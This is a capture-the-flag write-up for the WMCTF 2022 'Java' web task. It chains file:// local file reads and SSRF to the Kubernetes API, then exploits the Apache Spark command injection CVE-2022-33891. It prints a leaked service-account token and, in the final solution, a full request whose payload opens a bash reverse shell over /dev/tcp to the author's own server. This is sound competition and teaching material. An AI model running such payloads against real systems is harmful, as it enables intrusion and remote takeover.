# WMCTF 2022 - web writeup
## Intro
WMCTF was a very decent capture the flag competition with very hard and realistic tasks; We spot **23rd position** after 2 sleepless nights, it was a real pleasure to play with **SOter14** team. 
https://ctftime.org/team/194091
## Java - 15 solves (435 points)
<br/>
<p align="center">
<img src="https://github.com/anas-cherni/CTF-writeups/blob/main/WMCTF%202022/screenshots/task.png">
</p> 
<br/>

A simple form that sends post request to /file with two params: <br/>
- URL (url to visit)
- VCODE (captcha) and reflects back the result. We don't have source code of the task though.

The first thing I tested is **LFI(Local File Inclusion)** with file protocol file:// in order to read internal files, looks like an entrypoint!<br/>
I opened a lot of sensitive files and from .bash_history (/home/ctf/.bash_history) I found that the server is running apache tomcat, hence I tried to search for the right path to the source code of the running web app :<br/>
<p align="center">
<img src="https://github.com/anas-cherni/CTF-writeups/blob/main/WMCTF%202022/screenshots/source_code.png">
</p>
<br/> 
> file:///usr/local/tomcat8/webapps/ROOT.war

successfuly dumped the source code ! <br/>
<p align="center">
<img src="https://github.com/anas-cherni/CTF-writeups/blob/main/WMCTF%202022/screenshots/java_source.png">
</p>
<br/> 
 Let's focus on the .class files found in WEB-INF/classes/controller as they contain the logic of the webtask : <br/>
<p align="center">
<img src="https://github.com/anas-cherni/CTF-writeups/blob/main/WMCTF%202022/screenshots/class.png">
 </p>
 <br/>
 I used jdec online as a java decompiler <br> 
 <p align="center">
<img src="https://github.com/anas-cherni/CTF-writeups/blob/main/WMCTF%202022/screenshots/decompile.png">
 </p><br/>
 
 ```java
 /* Decompiler 13ms, total 665ms, lines 93 */
package controller;

import java.io.IOException;
import java.io.InputStream;
import java.net.URL;
import java.net.URLConnection;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;
import java.util.Map.Entry;
import javax.servlet.ServletException;
import javax.servlet.ServletOutputStream;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import org.apache.commons.io.IOUtils;
import util.SslUtils;

@WebServlet({"/file"})
public class IndexController extends HttpServlet {
   protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
      this.Response(resp, "Welcome to W&MCTF.");
   }

   protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
      String validateCode = req.getParameter("Vcode");
      String url = req.getParameter("url");
      if (req.getSession().getAttribute("code") == null) {
         this.Response(resp, "Please Enter Captcha.");
      }

      String sessionValidateCode = (String)req.getSession().getAttribute("code");
      if (!validateCode.equalsIgnoreCase(sessionValidateCode)) {
         this.Response(resp, "Verification code error.");
      } else {
         InputStream inputStream = null;
         URLConnection urlConnection = null;
         if (url.contains("`") || url.contains("%60") || url.contains("%25%36%30")) {
            this.Response(resp, "bad");
         }

         try {
            URL url1 = new URL(url);
            if ("https".equalsIgnoreCase(url1.getProtocol())) {
               SslUtils.ignoreSsl();
               HashMap<String, String> map = (HashMap)getHeaders(req);
               urlConnection = url1.openConnection();
               Iterator var10 = map.entrySet().iterator();

               while(var10.hasNext()) {
                  Entry item = (Entry)var10.next();
                  urlConnection.setRequestProperty(item.getKey().toString(), item.getValue().toString());
               }
            } else {
               urlConnection = url1.openConnection();
            }

            inputStream = urlConnection.getInputStream();
            IOUtils.copy(inputStream, resp.getOutputStream());
            resp.flushBuffer();
         } catch (Exception var15) {
            var15.printStackTrace();
         } finally {
            inputStream.close();
         }
      }

   }

   private void Response(HttpServletResponse resp, String outStr) throws IOException {
      resp.setCharacterEncoding("UTF-8");
      ServletOutputStream out = resp.getOutputStream();
      out.write(outStr.getBytes());
      out.flush();
      out.close();
   }

   private static Map<String, String> getHeaders(HttpServletRequest request) {
      Map<String, String> headerMap = new HashMap();
      Enumeration enumeration = request.getHeaderNames();

      while(enumeration.hasMoreElements()) {
         String name = (String)enumeration.nextElement();
         String value = request.getHeader(name);
         headerMap.put(name, value);
      }

      return headerMap;
   }
}
```

 > The other **VerifyCode.class** is handling the captcha and there is nothing interesting there.
 
 ### Notes:
 - The input validation is very suspicious, didn't found a logic explanation why the author is filtering ***`*** char.
 ```java
 if (url.contains("`") || url.contains("%60") || url.contains("%25%36%30")) {
            this.Response(resp, "bad");
         }
 ```
 
 - Ignoring SSL from incoming https request looks juicy
 
 
 ```java
  try {
            URL url1 = new URL(url);
            if ("https".equalsIgnoreCase(url1.getProtocol())) {
               SslUtils.ignoreSsl();
               HashMap<String, String> map = (HashMap)getHeaders(req);
               urlConnection = url1.openConnection();
               Iterator var10 = map.entrySet().iterator();

               while(var10.hasNext()) {
                  Entry item = (Entry)var10.next();
                  urlConnection.setRequestProperty(item.getKey().toString(), item.getValue().toString());
               }
            } else {
               urlConnection = url1.openConnection();
            }

            inputStream = urlConnection.getInputStream();
            IOUtils.copy(inputStream, resp.getOutputStream());
            resp.flushBuffer();
         } catch (Exception var15) {
            var15.printStackTrace();
         } finally {
            inputStream.close();
         }
 ```
 
From linux env file:
 > file:///proc/self/environ
<br/><p align="center">
<img src="https://github.com/anas-cherni/CTF-writeups/blob/main/WMCTF%202022/screenshots/token.png">
</p><br/>

```
eyJhbGciOiJSUzI1NiIsImtpZCI6Ik1IN0RxS0k3U0xhZ1ljYnk1WkE3WE5Mb2dMcVdLOXh5NXVEdmtfc2lKMWMifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6ImN0ZmVyLXRva2VuLXB6NWxtIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImN0ZmVyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQudWlkIjoiYjg2ODY0MTgtOWNiOC00MjZiLThkZmQtNTgxM2E1YTVmMTdiIiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmRlZmF1bHQ6Y3RmZXIifQ.JWwKPAYDMYDmqq-jg9Mzmvil-wG33skSqWsS3_zjv1bLGTRMUvP73w_LsLu7ptRJ1iofTbHBrgRyn01sJ2wjG8f-LruNFWwPj0S6zcGnfYlaUfG70lZIA7otXgEb2pCBzdqrxH4n4PR2aAE5wG-p_uoBjwiShrX-ykfxwErJMnwvJ15OQ57Y87QlZllkaYnvXgg3853qQ5ww414dz4UZ1BL7jXlcCjwbivHMifxMvUAL6GJWY-yoA3hJJBMNz5sjgUz71MXs-0wWLczDk5cv4mbXrjE-mCden5er32ifjsWBx6H_1i5JX6lSt3BP7iUxBQVaqLhnBtYR5nQuFADMFg
```
<br/>
Special thanks to my teammate Raf² for mentionning that this is a Kubernetes related stuff <br/>
<p align="center">
<img src="https://github.com/anas-cherni/CTF-writeups/blob/main/WMCTF%202022/screenshots/auth_k8s.png"><br/>
<img src="https://github.com/anas-cherni/CTF-writeups/blob/main/WMCTF%202022/screenshots/auth_bearer.png"><br/>
</p>

With that being said, we can **chain the LFI with SSRF** to access /apis endpoint with that token from localhost <br/>
<p align="center">
<img src="https://github.com/anas-cherni/CTF-writeups/blob/main/WMCTF%202022/screenshots/k8s_api_server.png"><br/>
</p>

> /apis/v1/namespaces

<br/><p align="center">
<img src="https://github.com/anas-cherni/CTF-writeups/blob/main/WMCTF%202022/screenshots/namespace.png">
 </p><br/>

> /api/v1/namespaces/ctf/pods/

```javascript
HTTP/1.1 200 
Date: Tue, 23 Aug 2022 02:35:08 GMT
Connection: close
Content-Length: 6185

{
  "kind": "PodList",
  "apiVersion": "v1",
  "metadata": {
    "selfLink": "/api/v1/namespaces/ctf/pods/",
    "resourceVersion": "1207989"
  },
  "items": [
    {
      "metadata": {
        "name": "spark-deploy-7b4fc6bdc7-64g7z",
        "generateName": "spark-deploy-7b4fc6bdc7-",
        "namespace": "ctf",
        "selfLink": "/api/v1/namespaces/ctf/pods/spark-deploy-7b4fc6bdc7-64g7z",
        "uid": "71b3e7d2-a0fc-4150-b59a-da8c42bc2391",
        "resourceVersion": "1203356",
        "creationTimestamp": "2022-08-23T02:00:01Z",
        "labels": {
          "app": "spark",
          "pod-template-hash": "7b4fc6bdc7"
        },
        "ownerReferences": [
          {
            "apiVersion": "apps/v1",
            "kind": "ReplicaSet",
            "name": "spark-deploy-7b4fc6bdc7",
            "uid": "4d451b5a-c85c-4949-8154-cec202f4f09f",
            "controller": true,
            "blockOwnerDeletion": true
          }
        ],
        "managedFields": [
          {
            "manager": "kube-controller-manager",
            "operation": "Update",
            "apiVersion": "v1",
            "time": "2022-08-23T02:00:01Z",
            "fieldsType": "FieldsV1",
            "fieldsV1": {"f:metadata":{"f:generateName":{},"f:labels":{".":{},"f:app":{},"f:pod-template-hash":{}},"f:ownerReferences":{".":{},"k:{\"uid\":\"4d451b5a-c85c-4949-8154-cec202f4f09f\"}":{".":{},"f:apiVersion":{},"f:blockOwnerDeletion":{},"f:controller":{},"f:kind":{},"f:name":{},"f:uid":{}}}},"f:spec":{"f:containers":{"k:{\"name\":\"easyspark\"}":{".":{},"f:image":{},"f:imagePullPolicy":{},"f:name":{},"f:ports":{".":{},"k:{\"containerPort\":8080,\"protocol\":\"TCP\"}":{".":{},"f:containerPort":{},"f:protocol":{}}},"f:resources":{},"f:terminationMessagePath":{},"f:terminationMessagePolicy":{}}},"f:dnsPolicy":{},"f:enableServiceLinks":{},"f:restartPolicy":{},"f:schedulerName":{},"f:securityContext":{},"f:terminationGracePeriodSeconds":{}}}
          },
          {
            "manager": "kubelet",
            "operation": "Update",
            "apiVersion": "v1",
            "time": "2022-08-23T02:00:03Z",
            "fieldsType": "FieldsV1",
            "fieldsV1": {"f:status":{"f:conditions":{"k:{\"type\":\"ContainersReady\"}":{".":{},"f:lastProbeTime":{},"f:lastTransitionTime":{},"f:status":{},"f:type":{}},"k:{\"type\":\"Initialized\"}":{".":{},"f:lastProbeTime":{},"f:lastTransitionTime":{},"f:status":{},"f:type":{}},"k:{\"type\":\"Ready\"}":{".":{},"f:lastProbeTime":{},"f:lastTransitionTime":{},"f:status":{},"f:type":{}}},"f:containerStatuses":{},"f:hostIP":{},"f:phase":{},"f:podIP":{},"f:podIPs":{".":{},"k:{\"ip\":\"10.244.0.228\"}":{".":{},"f:ip":{}}},"f:startTime":{}}}
          }
        ]
      },
      "spec": {
        "volumes": [
          {
            "name": "default-token-sbsqg",
            "secret": {
              "secretName": "default-token-sbsqg",
              "defaultMode": 420
            }
          }
        ],
        "containers": [
          {
            "name": "easyspark",
            "image": "wmctf2022/easyspark",
            "ports": [
              {
                "containerPort": 8080,
                "protocol": "TCP"
              }
            ],
            "resources": {
              
            },
            "volumeMounts": [
              {
                "name": "default-token-sbsqg",
                "readOnly": true,
                "mountPath": "/var/run/secrets/kubernetes.io/serviceaccount"
              }
            ],
            "terminationMessagePath": "/dev/termination-log",
            "terminationMessagePolicy": "File",
            "imagePullPolicy": "Never"
          }
        ],
        "restartPolicy": "Always",
        "terminationGracePeriodSeconds": 30,
        "dnsPolicy": "ClusterFirst",
        "serviceAccountName": "default",
        "serviceAccount": "default",
        "nodeName": "vm-22-6-ubuntu",
        "securityContext": {
          
        },
        "schedulerName": "default-scheduler",
        "tolerations": [
          {
            "key": "node.kubernetes.io/not-ready",
            "operator": "Exists",
            "effect": "NoExecute",
            "tolerationSeconds": 300
          },
          {
            "key": "node.kubernetes.io/unreachable",
            "operator": "Exists",
            "effect": "NoExecute",
            "tolerationSeconds": 300
          }
        ],
        "priority": 0,
        "enableServiceLinks": true
      },
      "status": {
        "phase": "Running",
        "conditions": [
          {
            "type": "Initialized",
            "status": "True",
            "lastProbeTime": null,
            "lastTransitionTime": "2022-08-23T02:00:01Z"
          },
          {
            "type": "Ready",
            "status": "True",
            "lastProbeTime": null,
            "lastTransitionTime": "2022-08-23T02:00:03Z"
          },
          {
            "type": "ContainersReady",
            "status": "True",
            "lastProbeTime": null,
            "lastTransitionTime": "2022-08-23T02:00:03Z"
          },
          {
            "type": "PodScheduled",
            "status": "True",
            "lastProbeTime": null,
            "lastTransitionTime": "2022-08-23T02:00:01Z"
          }
        ],
        "hostIP": "10.12.22.6",
        "podIP": "10.244.0.228",
        "podIPs": [
          {
            "ip": "10.244.0.228"
          }
        ],
        "startTime": "2022-08-23T02:00:01Z",
        "containerStatuses": [
          {
            "name": "easyspark",
            "state": {
              "running": {
                "startedAt": "2022-08-23T02:00:02Z"
              }
            },
            "lastState": {
              
            },
            "ready": true,
            "restartCount": 0,
            "image": "wmctf2022/easyspark:latest",
            "imageID": "docker://sha256:e3722f1aa05072ab638efd270372d3c4db589b11559e32ed4d7a898cd1fcebe0",
            "containerID": "docker://263ddc35cb938793a560cc5034a9f312fb73ef57fbffb86ff4b4692a4f5a6344",
            "started": true
          }
        ],
        "qosClass": "BestEffort"
      }
    }
  ]
}
```

Well seems that there are few more steps, To sum up: <br>
- There is a pod (the smallest execution unit in Kubernetes) that is running apache spark, in a container with exposed IP
- ```"ip": "10.244.0.228"```
- ```"containerPort": 8080```
- The ip is incrementing by one every 40 mins
- The flag hides in that container, we need to chain with RCE !<br/>
<p align="center">
<img src="https://github.com/anas-cherni/CTF-writeups/blob/main/WMCTF%202022/screenshots/spark.png">
 </p><br>

Well, it's **CVE-2022-33891** recently found by the security researcher **Kostya Kortchinsky**: https://www.socinvestigation.com/cve-2022-33891-apache-spark-shell-command-injection-detection-response/ <br/>
<p align="center">
<img src="https://github.com/anas-cherni/CTF-writeups/blob/main/WMCTF%202022/screenshots/CVE_explained.png">
 </p><br>

We're too close to reach our flag, it's a **blind os command injection** context that will give us **remote code execution**, but hold on! Remember that **\`** was blacklisted :)  
As a result, the proof of concept for this CVE ain't working :)
>http://10.244.0.228:8080/?doAs=\`COMMAND\`

The author said that I should dive deep in **Spark source** code in order to get an alternative, that's really tough ! 
## Final solution
```
POST /file HTTP/1.1
Host: 1.13.254.132:8080
Content-Length: 116
Accept: text/plain, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Origin: http://1.13.254.132:8080
Referer: http://1.13.254.132:8080/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=079D05EA2477663463009EADC94CA8B9
Connection: close

url=http://10.244.0.230:8080/?doAs=%253bbash%2b-i%2b>%2526%2b/dev/tcp/[personal VPS IP]/8888%2b0>%25261&Vcode=LRN9
```
#### Payload
```
http://10.244.0.230:8080/?doAs=%253bbash%2b-i%2b>%2526%2b/dev/tcp/[personal VPS IP]/8888%2b0>%25261
```
#### Notes
- "?doAs=;command" is a **proved alternative** for "?doAs=\`command\`"
- Ports are filtered and **only port 8888 is allowed as an external port**, so we are restricted to only listen on port 8888 in order to grab rev shell, ngrok won't work though cuz it generates random port. A private vps is a must for solving the chall.
<br/><p align="center">
<img src="https://github.com/anas-cherni/CTF-writeups/blob/main/WMCTF%202022/screenshots/revShell.png"><br/>
<img src="https://github.com/anas-cherni/CTF-writeups/blob/main/WMCTF%202022/screenshots/flag.png"><br/>
</p>
<br/>

## Finally

> Raf² and all my teammates are GODLIKE!. 
> RESPECT to Chara, the author of the task! 
> Looking forward to solve more difficult (and not guessy ofc) challs

<br/><br/>

n0s







 
 


